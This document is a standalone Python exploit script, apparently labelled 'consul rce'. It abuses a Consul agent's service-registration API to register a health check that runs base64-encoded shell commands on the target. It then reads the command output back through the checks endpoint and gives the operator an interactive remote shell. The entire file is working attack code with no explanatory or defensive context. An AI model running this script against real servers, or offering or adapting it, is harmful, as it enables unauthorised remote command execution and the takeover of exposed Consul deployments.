import requests
import sys
from base64 import b64encode
import json
import argparse
import time

isConnected = False
cmdOut = ""

def get_output(ip, port):
        address = 'http://{}:{}/v1/agent/checks?xx=xx'.format(ip, port)
        response = requests.get(address)
        result = response.json()

        return result['service:pwn']['Output']



def send_request(ip, port, command):
        global isConnected
        global cmdOut

        base64Command = b64encode(command.encode('utf-8')).decode('utf-8')

        command = "echo '{}' | base64 -d | sh".format(base64Command)
        # print(command)

        cookies = {
        }

        headers = {
        'Host': '{}:{}'.format(ip, port),
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Content-Length': '2137'


        }

        data = json.loads('''{
                "ID": "pwn",
        "Name": "pwn",
                "Address": "127.0.0.1",
                "Port": 80,
        "check": {
                "Args": ["sh", "-c","whoami"],
                "interval": "10s",
                "Timeout": "86400s"
                }
        }''')
        data['check']['Args'][2] = command

        data_request = json.dumps(data)

        address = 'http://{}:{}/v1/agent/service/register?replace-existing-checks=true'.format(ip, port)

        response = requests.put(address, headers=headers, cookies=cookies, data=data_request)
        if response.status_code == 200:
                # while True:

                if not isConnected:
                        print("connected")
                        isConnected = True
                        deregister(ip, port)
                else:
                        while True:
                                temp = get_output(ip, port)
                                if temp != cmdOut:
                                        cmdOut = temp
                                        print(temp)
                                        break





def deregister(ip, port):
        cookies = {
        }

        headers = {
        'Host': '{}:{}'.format(ip, port),
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Content-Length': '2137'


        }

        data = json.loads('''{
                "ID": "pwn",
        "Name": "pwn",
                "Address": "127.0.0.1",
                "Port": 80,
        "check": {
                "Args": ["sh", "-c","whoami"],
                "interval": "10s",
                "Timeout": "86400s"
                }
        }''')

        data_request = json.dumps(data)

        address = 'http://{}:{}/v1/agent/service/deregister/pwn'.format(ip, port)

        response = requests.put(address, headers=headers, cookies=cookies, data=data_request)
        if response.status_code == 200:
                return
        print("clear error {}".format(response))


def main(argv):
        global isConnected
        parser = argparse.ArgumentParser(description='consul rce')

        parser.add_argument('-i','--ip', help='ip', required=True)
        parser.add_argument('-p','--port', help='port', required=True)
        parser.add_argument('-e','--exec', help='command')
        parser.add_argument('-o','--out',action='store_true', help='get output')
        args = vars(parser.parse_args())
        ip = args['ip']
        port = args['port']
        command = "whoami"

        print("Trying to connect....\n")
        send_request(ip, port, command)

        if not isConnected:
                print("Cant't exploited!")
                exit(-1)

        while True:
                try:
                        command = input("> ")
                except:
                        isConnected = False
                        break
                if command.lower() == "exit":
                        isConnected = False
                        break
                send_request(ip, port, command)


        print("close connection...\n")
        deregister(ip, port)
        print("done!")

        return 0


if __name__ == "__main__":
   main(sys.argv[1:])